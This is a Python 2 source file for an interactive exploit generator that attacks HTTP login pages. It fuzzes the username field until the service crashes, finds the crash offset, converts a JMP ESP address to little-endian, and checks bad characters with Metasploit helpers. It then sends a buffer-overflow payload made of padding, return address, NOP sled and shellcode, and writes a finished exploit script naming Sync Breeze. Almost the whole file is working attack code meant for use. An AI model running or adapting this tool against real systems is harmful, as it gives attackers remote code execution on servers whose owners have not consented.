#!/usr/bin/env python2


import random
import string 
import time
import fileinput
from Banner import *
import shutil
import readline
import requests
import os
import sys
from subprocess import check_output 

W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m"   

try:  
   if sys.argv[0] and '-c' in sys.argv[1] and  len(sys.argv[1])==2\
   and'off' in sys.argv[2] and\
   len(sys.argv[2])==3 :
      W = ''     
      R = ''    
      G = ''  
      O = ''     
      B = ''    
      P = ''   
      Y = ''   
   else: 
       W='\033[0m'     
       R='\033[31m'
       print R+'[*]\n'+W+R+'PLZ SET THE COLOR TO OFF -c off'+W+'\n'+R+'='*25+'\n'
       exit()  
except IndexError:
          try:
            if sys.argv[1]:
               W='\033[0m'     
               R='\033[31m'
               print R+'[*]\n'+W+R+'PLZ SET THE COLOR TO OFF -c off'+W+'\n'+R+'='*25+'\n'
               exit()   
          except IndexError:
               pass  
class HTTPLOGIN():
    
     def __init__(self):
 
            with open('shell_code.py','w') as shell_code:
                 shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')  
            mode = """
            ========================                          
               Target Http Login
            ========================
            """
            print O+mode+W      
            time.sleep(2)
            self.app_name = str(raw_input(O+"\n[+] "+W+P+"application name : "+W))
            time.sleep(1)
            print Y+"\n\r\r!---___"+W+R+ "Use URl as 'https/http://hostip or Domain' login page/"+W+Y+'___---!'+W 
            time.sleep(2)
            self.web_req()
            self.Fuzzing__()
            self.string_ramdon()
            self.connect_servser()
            self.Option_return()
            self._hexadecimal() 
            self.little_endian() 
            self.import_char()              
            self.attack_all()
            self.auto_write()
     def web_req(self):
            try:
            	session = requests.session()
                self.target_url=str(raw_input(O+"\n[+]"+W+B+"Target Url : "+W))
                if '/'in self.target_url[-1]:
                    pass
                else:
                   self.target_url =self.target_url+'/'.strip() 
                response = session.get(self.target_url,timeout=5)                     
                if response.ok == True:
                     pass
            except Exception:
                print Y+"\n\r\r!---___"+W+R+ "Service Not Runing"+W+Y+'___---!'+W 
                time.sleep(0.75)
                return  self.web_req()    
            except KeyboardInterrupt:
                print Banner
                exit()
    
     def Fuzzing__(self):       				
          try:                
                self.Fuz_skip = 's'.lower() 
                self.Fuz_OPt  = "y".lower()  
                time.sleep(2)           
                banner2=Y+'\n\t\tFUZZING OPTIONS'+'\n\t   '+('='*22)
                print banner2
                time.sleep(2) 
                self.Fuzzing_in = str(raw_input(O+"\n[$]"+W+B+"To Start Fuzzing Enter" +W+R+"'Y'" +W+B+ "To skip Fuzzing Enter" +W+R+"'S'"+W+B+' : '+W))               
                if self.Fuzzing_in ==self.Fuz_skip and len(self.Fuzzing_in)==1:
                     pass
                
                elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
                    session = requests.session()
                    String = "A"
                    Fuzzer = 100
                    password = 'admin'
                    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 
                    try:
                        try:
                            while True: 
                                 data={ 
                                 'username': '{}'.format(String*Fuzzer),
                                 'password':'{}'.format(password),
                                 'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                                 }
                                 response = session.post(self.target_url,data=data,timeout=3)
                                 Fuzzer  +=100
                                 time.sleep(1)
                                 print B+"###--> "+W,Fuzzer   
                                 sys.stdout.write('\x1b[1A')
                                 sys.stdout.write('\x1b[2K') 
                                                         
                        except requests.exceptions.ConnectionError:
                          pass
                        except requests.exceptions.ReadTimeout:
                             if  Fuzzer > 100:                           
                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(Fuzzer)+W+ R+ " Characters"+W 
                             else:
                                print Y+"\n\r\r!---___"+W+R+ "String Pattern NOT Generated"+W+Y+'___---!'+W
                                time.sleep(1)
                                print Y+"\n\r\r!---___"+W+R+ "service not repoinding "+W+Y+'___---!'+W
                                time.sleep(1)
                                self.ip_port()
                                self.Fuzzing__() 
                                self.string_ramdon() 
                                self.connect_servser() 
                                self.Option_return()
                                self._hexadecimal()                                
                                self.import_char()                                   
                                self.attack_all()
                                self.auto_write()
                                
                    except KeyboardInterrupt:
                        print  Banner
                        exit() 

                    try:
                        print Y+"\n\r\r!---___"+W+P+ "Buffer OverFlow discover"+W+Y+'___---!'+W 
                        input= raw_input(O+"\n\t\t!_________application  not repoinding restart then Press any key to Continue________! \n"+W)
                    except NameError:
                           pass	                                                        
                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(Fuzzer))).lower()  
                    self.Random_String = bytearray(self.Random_String)
                    time.sleep(2)
                    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
                    time.sleep(2)  
                    if self.Random_String  > 0:
                           self.connect_servser() 
                           self.Option_return()
                           self._hexadecimal() 
                           self.little_endian()  
                           self.import_char()                                
                           self.attack_all()
                           self.auto_write()   
                                                                                                                                                                          
                else:         
                   time.sleep(2)    
                   print Y+"\n[-]"+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
                   return self.Fuzzing__()             
          except KeyboardInterrupt:
                    print  Banner
                    exit()
                   
     def string_ramdon(self): 
             banner2=Y+'\n\t\tString Pattern'+'\n\t   '+('='*22)
             print banner2        
             try:                      
	 	    Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
		    time.sleep(2)
		    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(Requst_String )).lower()  
                    self.Random_String = bytearray(self.Random_String)
		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
             except Exception:
                    time.sleep(2)
                    print Y+"\n\r\r!---___"+W+R+ "Check input integer Required"+W+Y+'___---!'+W
                    return self.string_ramdon()		 
             except KeyboardInterrupt:
                    print  Banner
                    exit()                 		 
 
     def connect_servser(self):
        try:
            try:
               session = requests.session()
               response = session.get(self.target_url,timeout=5)
               if response.ok == True:
     	          while True:
                    try:
                       session = requests.session()
                       password = 'admin' 
                       data={ 
                       'username': '{}'.format(self.Random_String),
                       'password':'{}'.format(password),
                       'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                       }
                       response = session.post(self.target_url,data=data,timeout=3)
                          
                    except :
                 	   print Y+"\n\r\r!---___"+W+R+ "Data Send Successful"+W+Y+'___---!'+W
                 	   time.sleep(2)
                           print Y+"\n\r\r!---___"+W+R+ "please Restart The Service"+W+Y+'___---!'+W
                 	   break
               else:
                   print Y+"\n\r\r!---___"+W+P+"Connection is Down Socket.Erro"+W+Y+'___---!'+W
                   time.sleep(1)
                   print Y+"\n\r\r!---___"+W+P+"please Restart The Service and try agin"+W+Y+'___---!'+W	   
                   self.connect_servser()
            except requests.exceptions.ReadTimeout:
                print Y+"\n\r\r!---___"+W+P+"Connection is Down Socket.Erro"+W+Y+'___---!'+W
                print Y+"\n\r\r!---___"+W+P+"please Restart The Service and try agin"+W+Y+'___---!'+W	
                self.Fuzzing__()
                self.connect_servser()
        except KeyboardInterrupt:
            print  Banner
            exit()
     def Option_return(self):
       
           try:
               continue_1   = "c".lower()            
               return_back  = "b".lower()
               op_sel = str(raw_input(Y+"\n[<>]"+W+R+"To Continue Press "+W+B+"C "+W+R +"To Return Back Press "+W+B+" B : "+W)).lower()
               if op_sel== continue_1 and  len(op_sel)==1:
                    pass
                    
               elif op_sel ==return_back and len(op_sel)==1:
                    self.string_ramdon()
                    self.connect_servser()
                    self.Option_return()
               else:
                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+"or"+W+B+" B"+W+Y+" [-]"+W 
                  self.Option_return()
           except KeyboardInterrupt:
                   print  Banner
                   exit()
                               
     def _hexadecimal(self):
          banner2=Y+'\n\t\tCRACH ADDRESS'+'\n\t   '+('='*22)+W
          print banner2                                                                         
          while True:
                 try: 
		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		       time.sleep(2)
		       print Y+"\n[+]"+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)		       
		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                       break
		    else:
	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+'___---!'+W
	               time.sleep(2)
	               return self._hexadecimal() 
	                
	         except Exception:
	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUN"+W+Y+'___---!'+W 
	               return self._hexadecimal()               	        
                 except KeyboardInterrupt:
                       print  Banner
                       exit() 
     def import_char(self): 
         try:
            banner2 = Y+'\n\t\tBad_Character'+'\n\t   '+('='*22)+W
            print banner2            
            time.sleep(1)
            Bad = "yes".lower()
            Bad_no = "no".lower()                 
            bad_op = str(raw_input(Y+"\n[+] "+W+R+"Test Bad_Character Enter "+W+B+"yes "+W+R +"Skip Enter "+W+B+" no : "+W)).lower()            
            if bad_op == Bad and len(Bad)==3: 
                banner = """  
                    ========================                          
                      Bad_Character start
                    ======================== 
                    """
                print P+banner+W 
                with open('.data','w')as data :
                    data1 = data.write(self.target_url+'\n'+str(self.location))       
                time.sleep(2)
                from Bad_Character import Bad_Character_HTTP           
                run = Bad_Character_HTTP()
                from Msf_Helper  import Msf_Helper
                go = Msf_Helper()
            elif bad_op ==Bad_no and len(Bad_no)==2: 
                time.sleep(0.30)
                print Y+"\n\r\r!---___"+W+O+"Default BadCharacter = "+W+P+"'\\x00'"+W+Y+'___---!'+W
                self.badchar ='\\x00'
                ok = 'yes'.lower()
                no = 'no'.lower()
                time.sleep(0.75)
                banner2 = Y+'\n\t\tSCHELLCODE & LISTNER'+'\n\t     '+('='*25)+W
                print banner2
                opt_code = str(raw_input(O+"\n[$] "+W+B+"Generate ShellCode and Listner " +W+Y+"'Yes'" +W+B+ " skip Enter " +W+Y+"'no'"+W+B+' : '+W)).lower()
                if opt_code == ok and len(opt_code)==3 :		              
                    time.sleep(1)                                     
                    try:
                       host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
                       with open('.data','w') as append:
                           append_bad =append.write(self.badchar+'\n'+ host_ip.replace(' ','\n'))  
                    except Exception:
                            host_ip = str(raw_input(O+"\n[%]"+W+B+"Enter Local ip "+W+O+" :"+W))  
                            with open('.data','w') as append:
                                append_bad =append.write(self.badchar+'\n'+ host_ip.replace(' ','\n'))
                    from Msf_Helper  import Msf_Char_NO
                    go = Msf_Char_NO()
                elif opt_code == no and len(opt_code)==2 :                     
                    stop  = str(raw_input(R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W ))     
                    pass
            else:
              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
              self.import_char()                   
         except KeyboardInterrupt:
                print  Banner
                exit()          
                   
         
     def little_endian(self):
               banner2=Y+'\n\t\tJMP ESP'+'\n\t   '+('='*22)+W
               print banner2
               try:
                    jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                    if len(jump) < 4 :
                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
	                return self.little_endian()  
	            else:
	               pass                         
                    time.sleep(2)
                    self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                    self.display =self.jump_address# for print olnly
                    self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                    self.display= self.display.replace(" ", "")
                    time.sleep(2)
                    self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                    print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
               except Exception:
	               print Y+"\n\r\r!---___"+W+R+ "TypeError: Non-hexadecimal digit found"+W+Y+'___---!'+W 
	               return self.little_endian()                       
               except KeyboardInterrupt:
                    print  Banner
                    exit()
                                
     def attack_all(self):
               banner2=Y+'\n\t\tFainal Status'+'\n\t   '+('='*22)+W                                       
               print banner2       
	       from shell_code import shell_code  
	       if len(shell_code) < 50:
                     print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
                     print B+"\n\t\t\t!__________________Dedicated_No_Shell_Code______________________!"+W
                     exit()
               else:
                   pass          
	       try:	                     
                   Start_string = self.location*"A"        
                   self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                   self.NO_Operation =self.NO_Operation*"\x90"
                   self.count = self.NO_Operation.count("\x90")    
                   attack = Start_string+self.jump_address+ self.NO_Operation + str(shell_code) 
                   time.sleep(2)
                   print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell_code'+W
                   time.sleep(2)
                   print Y+"\n[+]"+W+R+"Target URL "+W+O+ " : "+W, P+self.target_url+W
                   time.sleep(2)
                   try:
                      session = requests.session()
                      response = session.get(self.target_url,timeout=5)
                      if response.ok == True:                  
                         try:
                            while True:
                              session = requests.session()
                              password = 'admin' 
                              data={ 
                              'username': '{}'.format(attack),
                              'password':'{}'.format(password),
                              'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                              }
                              response = requests.post(self.target_url,data=data,timeout=3) 
                                          
                         except Exception :
                             print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                             time.sleep(2)
                             print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W 
                   except Exception ,exc : 
                       print Y+"\n\r\r!---___"+W+P+ "application  not repoinding Socket.Error "+W+O+"%s" %exc+W+Y+'___---!'+W      
                       self.little_endian()
                       self.attack_all()               
               except KeyboardInterrupt:
                   print  Banner
                   exit()  
                   
     def auto_write(self): 
                from shell_code import shell_code      	     
                try:                
                  shell =str(shell_code).encode("hex")
                  shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                  self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                  copy_format= shutil.copy("./TemplateExploit/payload3.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
                     
                  file= './ExploitStore/'+self.app_name+"_Exploit.py"
                  for line in fileinput.FileInput(file,inplace=1):
	                if '# application name :'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ 'Sync Breeze' +'\n')
				 
	                if '_Offset_Byte  =  "A"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.location)+'\n')
				 
		        if '_JMP_ESP      ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
				 
	                if '_NO_OPT       = "\\x90"'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.count) +'\n')
		        if '_Shell_Code   = ('in line:
		             line = line.rstrip()
		             line = line.replace(line,line+ self.shell_code+ ')'+'\n') 
			     
		        if 'Target_Url ='in line:
		            line = line.rstrip()
			    line = line.replace(line,line+'"'+self.target_url+'"'+"\n") 
					   
		        print line,
		        
                  time.sleep(2)
		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W 
		  time.sleep(2)     
                  print   Banner
	          try :		
                     os.remove('.data')
		     os.remove('.resource')  
		     exit() 
		  except OSError:
			exit()	
                except KeyboardInterrupt:    
                     print   Banner                              	
                     exit()

		          
if __name__ == '__main__':
   HTTPLOGIN
